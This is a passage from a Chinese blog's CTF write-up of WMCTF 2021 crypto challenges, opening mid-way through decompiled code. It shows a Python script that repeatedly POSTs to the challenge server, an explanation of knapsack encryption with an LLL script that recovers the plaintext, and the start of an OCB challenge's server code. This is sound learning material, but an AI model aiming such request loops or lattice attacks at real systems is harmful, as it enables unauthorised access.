v12;</span><br><span class="line">LABEL_24:</span><br><span class="line">    <span class="function"><span class="keyword">operator</span> <span class="title">delete</span><span class="params">(v9)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> v12;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="built_in">malloc</span>(<span class="number">0x408</span>u);</span><br><span class="line">  v14 = (<span class="keyword">int32x4_t</span>)xmmword_29F00;</span><br><span class="line">  v15 = <span class="number">0LL</span>;</span><br><span class="line">  v16.n128_u64[<span class="number">0</span>] = <span class="number">0x400000004</span>LL;</span><br><span class="line">  v16.n128_u64[<span class="number">1</span>] = <span class="number">0x400000004</span>LL;</span><br><span class="line">  v17.n128_u64[<span class="number">0</span>] = <span class="number">0x800000008</span>LL;</span><br><span class="line">  v17.n128_u64[<span class="number">1</span>] = <span class="number">0x800000008</span>LL;</span><br><span class="line">  *(_QWORD *)v13 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v18 = (<span class="keyword">char</span> *)&amp;v13[v15];</span><br><span class="line">    v15 += <span class="number">8LL</span>;</span><br><span class="line">    v19 = vaddq_s32(v14, v16);</span><br><span class="line">    *(<span class="keyword">int32x4_t</span> *)(v18 + <span class="number">8</span>) = v14;</span><br><span class="line">    v14 = vaddq_s32(v14, v17);</span><br><span class="line">    *(<span class="keyword">int32x4_t</span> *)(v18 + <span class="number">24</span>) = v19;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v15 != <span class="number">256</span> );</span><br><span class="line">  v20 = <span class="number">0LL</span>;</span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  v23 = (<span class="keyword">char</span> *)(v13 + <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v24 = *(_DWORD *)&amp;v23[v20];</span><br><span class="line">    v21 += a12345678[v22] + v24;</span><br><span class="line">    v25 = (<span class="keyword">char</span> *)&amp;v13[v21];</span><br><span class="line">    <span class="keyword">if</span> ( v22 + <span class="number">1</span> &lt; <span class="number">8</span> )</span><br><span class="line">      ++v22;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v22 = <span class="number">0</span>;</span><br><span class="line">    *(_DWORD *)&amp;v23[v20] = *((_DWORD *)v25 + <span class="number">2</span>);</span><br><span class="line">    v20 += <span class="number">4LL</span>;</span><br><span class="line">    *((_DWORD *)v25 + <span class="number">2</span>) = v24;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v20 != <span class="number">1024</span> );</span><br><span class="line">  v26 = <span class="number">0LL</span>;</span><br><span class="line">  LOBYTE(v27) = <span class="number">0</span>;</span><br><span class="line">  LOBYTE(v28) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v27 = (<span class="keyword">unsigned</span> __int8)(v27 + <span class="number">1</span>);</span><br><span class="line">    v29 = (<span class="keyword">char</span> *)(v13 + <span class="number">2</span>);</span><br><span class="line">    v30 = v13[v27 + <span class="number">2</span>];</span><br><span class="line">    v28 = (<span class="keyword">unsigned</span> __int8)(v30 + v28);</span><br><span class="line">    v31 = v13[v28 + <span class="number">2</span>];</span><br><span class="line">    *(_DWORD *)&amp;v29[<span class="number">4</span> * v27] = v31;</span><br><span class="line">    *(_DWORD *)&amp;v29[<span class="number">4</span> * v28] = v30;</span><br><span class="line">    *((_BYTE *)dest + v26++) ^= LOBYTE(v13[(<span class="keyword">unsigned</span> __int8)(v31 + v30) + <span class="number">2</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v26 != <span class="number">32</span> );</span><br><span class="line">  *v13 = v27;</span><br><span class="line">  v13[<span class="number">1</span>] = v28;</span><br><span class="line">  v32 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *((<span class="keyword">unsigned</span> __int8 *)dest + v32) == enc[v32] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)++v32 &gt; <span class="number">0x1F</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v12 = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (v8 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">  <span class="keyword">return</span> v12;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下次也不一定</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210828 WMCrypto方向部分复现</title>
    <url>/posts/37313bc0/</url>
    <content><![CDATA[<p>woc，这也太难了吧，简直是神仙在打架，看着解出人数就没有什么信心做下去了</p>
<p><a href="https://mp.weixin.qq.com/s/d9qMCbKhM5VTDb9s2ch0rg">全a了，大师傅的博客</a>，然后发WP的那一刻环境也关了</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210830075445852.png" alt="image-20210830075445852"></p>
<p>四道题，一道考格在背包，一道考格在RSA的AGCD，一道考AES.OCB，最后一道不清楚考点</p>
<span id="more"></span>

<h1 id="WM"><a href="#WM" class="headerlink" title="WM"></a>WM</h1><h2 id="Crypto-checkin（recuring）"><a href="#Crypto-checkin（recuring）" class="headerlink" title="Crypto-checkin（recuring）"></a>Crypto-checkin（recuring）</h2><blockquote>
<p>众所周知，L1near是一个著名大黑客，他为W&amp;M编写了一个全自动的水群机器人， 我们偷到了L1near在开发时的简易版本，并且获得了交互的接口，你能帮我们找到L1near偷偷藏起来的flag吗？</p>
</blockquote>
<p><a href="http://47.104.243.99:10000/">Link</a></p>
<p>第二天上了update</p>
<blockquote>
<p>请提交合法的secret中最小的那个，题目没有说清楚，给各位师傅添麻烦了～</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>W&amp;M exclusive robot<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">h1</span> &#123;<span class="attribute">text-align</span>:center&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">p</span> &#123;<span class="attribute">text-align</span>:center&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">form</span> &#123;<span class="attribute">text-align</span>:center&#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Fully automatic rp system<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>Come and get your rp value today!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;show.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">id</span>=<span class="string">&quot;rp&quot;</span> <span class="attr">name</span>=<span class="string">&quot;rp&quot;</span> <span class="attr">value</span>=<span class="string">&quot;rp&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Get today&#x27;s rp!&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">ran</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> rp = <span class="built_in">Math</span>.floor( <span class="built_in">Math</span>.random() * <span class="number">100</span>);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;rp&quot;</span>).setAttribute(<span class="string">&#x27;value&#x27;</span>,rp);</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript">    ran();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">-------------------------------------------------------</span></span><br><span class="line"><span class="comment">Maybe there are some Easter eggs?</span></span><br><span class="line"><span class="comment">So where are them?</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<p>rp是0到99的整数，但是post100会得到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210828113817600.png" alt="image-20210828113817600"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>W&amp;M exclusive robot<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">    <span class="selector-tag">h1</span> &#123;<span class="attribute">text-align</span>:center&#125;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">p</span> &#123;<span class="attribute">text-align</span>:center&#125;</span></span><br><span class="line"><span class="css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Fully automatic rp system<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Come and get your rp value today!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;/<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Your rp value:100<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Wow! Golden legend!<span class="comment">&lt;!-- so why not try to post &#x27;flag&#x27; as rp? --&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有分析出什么东西，稍微梳理一下</p>
<ul>
<li><p>0~19</p>
<p><code>Ah-ha! There is a idiot!</code></p>
</li>
<li><p>20~39</p>
<p><code>Gee, this is too miserable.</code></p>
</li>
<li><p>40~59</p>
<p><code>Oh, you almost passed it!</code></p>
</li>
<li><p>60~79</p>
<p><code>Fortunately, you passed 60.</code></p>
</li>
<li><p>80~99</p>
<p><code>You are Koi! Congratulations!</code></p>
</li>
<li><p>100</p>
<p><code>Wow! Golden legend!&lt;!-- so why not try to post &#39;flag&#39; as rp? --&gt;</code></p>
</li>
<li><p>flag</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Your rp value:1620418829165478</span><br><span class="line"></span><br><span class="line">What happend to my bot?????</span><br><span class="line"></span><br><span class="line">Let me find something in my backpack which can fix this bug!</span><br></pre></td></tr></table></figure></li>
</ul>
<p>第一次写post脚本，祭奠一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exDigit</span>(<span class="params">String</span>):</span></span><br><span class="line">    d = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> String:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> &lt;= j &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            d = d * <span class="number">10</span> + <span class="built_in">int</span>(j)</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">x = <span class="number">999999999999999999999999999999999</span></span><br><span class="line">url = <span class="string">&quot;http://47.104.243.99:10000/show.php&quot;</span></span><br><span class="line">r = requests.post(url, &#123;<span class="string">&quot;rp&quot;</span>: <span class="number">2017515922459700</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65537</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&#x27;WMCTF&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&#x27;wmctf&#x27;</span> <span class="keyword">in</span> r.text <span class="keyword">or</span> <span class="string">&#x27;1620418829165478&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="built_in">print</span>(x)</span><br><span class="line">    line = r.text[<span class="number">205</span>:][:<span class="number">37</span>]</span><br><span class="line">    t = exDigit(line)</span><br><span class="line">    <span class="keyword">if</span> t &lt; x:</span><br><span class="line">        x = t</span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">&quot;rp&quot;</span>: t</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url, payload)</span><br></pre></td></tr></table></figure>

<p>然而看了WP后发现，这些搜集的信息都没什么用，我直接原地爆炸</p>
<p>考的是背包，<a href="https://ctf-wiki.org/crypto/asymmetric/knapsack/knapsack/">CTF Wiki上这篇背包挺通俗易懂的</a>，主要掌握以下这些概念吧：<strong>超递增</strong>，<strong>Merkle–Hellman背包加密</strong>，<strong>构造01格破解</strong></p>
<p>不过是看了WP还不懂系列。首先想知道是怎么看出这机器背后是背包加密的，然后为什么<code>post 2^i+a</code>就可以得到背包每一项的值，<code>i</code>和<code>a</code>分别是什么</p>
<p>目前的理解是，<code>post flag</code>得到的<code>1620418829165478</code>就是密文，然后破解得到私钥，解密</p>
<p>但目前还有很多疑点以及不懂的地方，太难了，后续补充吧</p>
<hr>
<p>来了，这是这几天来的第三次复现，看了Striving师傅的博客终于或多或少有点理解了。好吧，原来菜鸡是我自己</p>
<p>看到backpack想到的背包，当时一直以为是备份的意思</p>
<p>简单介绍下<strong>背包加密</strong>，又是从la佬这里学习而来</p>
<p>首先<strong>背包问题</strong>就是我们熟知的背包问题，下面这段话也许能重拾记忆</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210903154901333.png" alt="image-20210903154901333"></p>
<ul>
<li><p>私钥生成</p>
<p>选择一个<strong>超递增集</strong>${s_1, s_2, \cdots, s_n}$</p>
<p>所谓的超递增集就是满足第i个数大于前面所有数的和</p>
</li>
<li><p>公钥生成</p>
<ol>
<li><p>选取模数m，确保$m&gt;\sum\limits_{i=1}^n s_i$</p>
</li>
<li><p>选取乘数w，确保$(w,\ m)=1$，这里又说w也是私钥</p>
</li>
<li><p>生成公钥集$t_i$，$t_i\equiv ws_i\ (mod\ m)$</p>
</li>
</ol>
</li>
<li><p>加密</p>
<p>明文b的每一位的二进制为$b_i$<br>$$<br>c=\sum\limits_{i=1}^nt_ib_i\ (mod\ m)<br>$$</p>
</li>
<li><p>解密</p>
<p>先求$w^{-1}$，则<br>$$<br>b=\sum\limits_{i=1}^nw^{-1}t_ib_i\ (mod\ m)=\sum\limits_{i=1}^ns_ib_i\ (mod\ m)<br>$$</p>
</li>
</ul>
<p>该密码系统有一个密度，为$d=\frac{n}{log_2(max{t_i})}$</p>
<p>然后就是看不懂的地方说，Striving师傅说春哥师傅说每次post$2^i$，会发现周期是32，得到的值也就公钥集里面的值。借下数据，相当于知道公钥集和密文，要求明文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = [<span class="number">97005071980911</span>, <span class="number">32652300906411</span>, <span class="number">73356817713575</span>, <span class="number">108707065719744</span>, <span class="number">103728503304990</span>, <span class="number">49534310783118</span>, <span class="number">53330718889073</span>, <span class="number">2121345207564</span>, <span class="number">46184783396167</span>, <span class="number">115771983454147</span>, <span class="number">64261597617025</span>, <span class="number">2311575715655</span>, <span class="number">56368973049223</span>, <span class="number">84737125416797</span>, <span class="number">24316288533033</span>, <span class="number">82963866264519</span>, <span class="number">101019837363048</span>, <span class="number">25996629336722</span>, <span class="number">41785472478854</span>, <span class="number">68598110798404</span>, <span class="number">40392871001665</span>, <span class="number">94404798756171</span>, <span class="number">54290928637774</span>, <span class="number">112742212150946</span>, <span class="number">91051110026378</span>, <span class="number">124542182410773</span>, <span class="number">40388473698647</span>, <span class="number">22059564851978</span>, <span class="number">57353373067776</span>, <span class="number">80692115733908</span>, <span class="number">84559172686971</span>, <span class="number">28186390895657</span>]</span><br><span class="line">c = <span class="number">1620418829165478</span></span><br></pre></td></tr></table></figure>

<p>有了这个可以求出密度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> log</span><br><span class="line"></span><br><span class="line">d = <span class="built_in">len</span>(t) / log(<span class="built_in">max</span>(t), <span class="number">2</span>)</span><br><span class="line"><span class="comment"># d = 0.6834156494834176</span></span><br></pre></td></tr></table></figure>

<p>说是低密度可以直接搞，不太懂原理，抄个脚本，也是用到格</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210903164957451.png" alt="抄自论文"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t = [<span class="number">97005071980911</span>, <span class="number">32652300906411</span>, <span class="number">73356817713575</span>, <span class="number">108707065719744</span>, <span class="number">103728503304990</span>, <span class="number">49534310783118</span>, <span class="number">53330718889073</span>, <span class="number">2121345207564</span>, <span class="number">46184783396167</span>, <span class="number">115771983454147</span>, <span class="number">64261597617025</span>, <span class="number">2311575715655</span>, <span class="number">56368973049223</span>, <span class="number">84737125416797</span>, <span class="number">24316288533033</span>, <span class="number">82963866264519</span>, <span class="number">101019837363048</span>, <span class="number">25996629336722</span>, <span class="number">41785472478854</span>, <span class="number">68598110798404</span>, <span class="number">40392871001665</span>, <span class="number">94404798756171</span>, <span class="number">54290928637774</span>, <span class="number">112742212150946</span>, <span class="number">91051110026378</span>, <span class="number">124542182410773</span>, <span class="number">40388473698647</span>, <span class="number">22059564851978</span>, <span class="number">57353373067776</span>, <span class="number">80692115733908</span>, <span class="number">84559172686971</span>, <span class="number">28186390895657</span>]</span><br><span class="line">ct = <span class="number">1620418829165478</span></span><br><span class="line">n = <span class="built_in">len</span>(t)</span><br><span class="line">M = Matrix.identity(n)</span><br><span class="line"></span><br><span class="line">last_row = [<span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> t]</span><br><span class="line">M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">last_col = t[:]</span><br><span class="line">last_col.append(ct)</span><br><span class="line">M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">M = M.stack(M_last_row)</span><br><span class="line">M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">X = M.LLL()</span><br><span class="line">target = X[-<span class="number">1</span>][:-<span class="number">1</span>]</span><br><span class="line">ans = [<span class="built_in">abs</span>(k) <span class="keyword">for</span> k <span class="keyword">in</span> target]</span><br><span class="line">flag = <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> ans])[::-<span class="number">1</span>], <span class="number">2</span>)</span><br><span class="line"><span class="comment"># 4159506287</span></span><br></pre></td></tr></table></figure>

<p>魔改la佬的脚本</p>
<p>然后听说把解密得到的flag这串数字post过去就得到flag了，你得到了吗</p>
<hr>
<h2 id="Crypto-ocb（unsolved）"><a href="#Crypto-ocb（unsolved）" class="headerlink" title="Crypto-ocb（unsolved）"></a>Crypto-ocb（unsolved）</h2><blockquote>
<p>L1near已经疲倦了AK比赛的生活了，他想趁此机会学习一下AES.OCB，这是他最新实现的一个加密系统，你来帮他看看有什么问题吧。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ocb.aes <span class="keyword">import</span> AES <span class="comment"># https://github.com/kravietz/pyOCB</span></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> ocb <span class="keyword">import</span> OCB</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> s1 , s2 : <span class="built_in">bytes</span>([x1^x2 <span class="keyword">for</span> x1,x2 <span class="keyword">in</span> <span class="built_in">zip</span>(s1,s2)])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(data) % <span class="number">16</span> != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(data[-<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">if</span>(data[-<span class="number">1</span>] != data[-<span class="number">1</span>-i]):</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> check(data):</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    padlen = <span class="number">16</span> - <span class="built_in">len</span>(data) % <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> data + padlen * <span class="built_in">bytes</span>([padlen])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpad</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check(data):</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">return</span> data[:-data[-<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line">BANNER =<span class="string">br&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"> __      __          ___                                           __                                               __       ___  </span></span><br><span class="line"><span class="string">/\ \  __/\ \        /\_ \                                         /\ \__                                           /\ \__  /&#x27;___\ </span></span><br><span class="line"><span class="string">\ \ \/\ \ \ \     __\//\ \     ___    ___     ___ ___      __     \ \ ,_\   ___       __  __  __    ___ ___     ___\ \ ,_\/\ \__/ </span></span><br><span class="line"><span class="string"> \ \ \ \ \ \ \  /&#x27;__`\\ \ \   /&#x27;___\ / __`\ /&#x27; __` __`\  /&#x27;__`\    \ \ \/  / __`\    /\ \/\ \/\ \ /&#x27; __` __`\  /&#x27;___\ \ \/\ \ ,__\</span></span><br><span class="line"><span class="string">  \ \ \_/ \_\ \/\  __/ \_\ \_/\ \__//\ \L\ \/\ \/\ \/\ \/\  __/     \ \ \_/\ \L\ \   \ \ \_/ \_/ \/\ \/\ \/\ \/\ \__/\ \ \_\ \ \_/</span></span><br><span class="line"><span class="string">   \ `\___x___/\ \____\/\____\ \____\ \____/\ \_\ \_\ \_\ \____\     \ \__\ \____/    \ \___x___/&#x27;\ \_\ \_\ \_\ \____\\ \__\\ \_\ </span></span><br><span class="line"><span class="string">    &#x27;\/__//__/  \/____/\/____/\/____/\/___/  \/_/\/_/\/_/\/____/      \/__/\/___/      \/__//__/   \/_/\/_/\/_/\/____/ \/__/ \/_/ </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">MENU = <span class="string">br&#x27;&#x27;&#x27;[+] 1.Encrypt</span></span><br><span class="line"><span class="string">[+] 2.Decrypt</span></span><br><span class="line"><span class="string">[+] 3.Get flag</span></span><br><span class="line"><span class="string">[+] 4.Exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">socketserver.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span>(<span class="params">self</span>):</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            part = self.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(part) &lt; BUFF_SIZE:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">self, msg, newline=<span class="literal">True</span></span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> newline:</span><br><span class="line">                msg += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span>(<span class="params">self, prompt=<span class="string">b&#x27;[-] &#x27;</span></span>):</span></span><br><span class="line">        self.send(prompt, newline=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> self._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">        _hexdigest = sha256(proof.encode()).hexdigest()</span><br><span class="line">        self.send(<span class="string">f&quot;[+] sha256(XXXX+<span class="subst">&#123;proof[<span class="number">4</span>:]&#125;</span>) == <span class="subst">&#123;_hexdigest&#125;</span>&quot;</span>.encode())</span><br><span class="line">        x = self.recv(prompt=<span class="string">b&#x27;[+] Plz tell me XXXX: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:].encode()).hexdigest() != _hexdigest:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, nonce, message, associate_data=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">assert</span> nonce <span class="keyword">not</span> <span class="keyword">in</span> self.NONCEs</span><br><span class="line">        self.NONCEs.append(nonce)</span><br><span class="line">        self.ocb.setNonce(nonce)</span><br><span class="line">        message = pad(message)</span><br><span class="line">        tag, cipher = self.ocb.encrypt(<span class="built_in">bytearray</span>(message), <span class="built_in">bytearray</span>(associate_data))</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">bytes</span>(cipher), <span class="built_in">bytes</span>(tag))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, nonce, cipher, tag, associate_data=<span class="string">b&#x27;&#x27;</span></span>):</span></span><br><span class="line">        self.ocb.setNonce(nonce)</span><br><span class="line">        authenticated, message = self.ocb.decrypt(*<span class="built_in">map</span>(<span class="built_in">bytearray</span>, (associate_data, cipher, tag)))</span><br><span class="line">        message = unpad(message)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> authenticated:</span><br><span class="line">            self.send(<span class="string">b&quot;[!] Who are you???&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> message</span><br><span class="line"></span><br><span 